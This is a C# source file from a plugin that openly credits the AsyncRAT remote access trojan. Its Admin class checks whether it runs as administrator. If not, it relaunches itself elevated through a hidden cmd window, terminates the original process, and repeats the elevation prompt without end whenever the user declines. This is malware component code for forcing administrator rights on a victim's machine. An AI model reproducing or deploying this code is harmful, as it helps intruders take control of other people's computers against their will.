using System.Diagnostics;
using System.Security.Principal;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Code coming from AsyncRAT ||
*/

namespace Plugin
{
    internal static class Admin
    {
        internal static void AskAdminRight() 
        {
            if (IsAdmin()) return;
            try
            {
                Process proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/k START \"\" \"" + Application.ExecutablePath + "\" & EXIT",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas",
                        UseShellExecute = true
                    }
                };
                proc.Start();
                Imports.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
            }
            catch { AskAdminRight(); }
        }
  
        private static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}
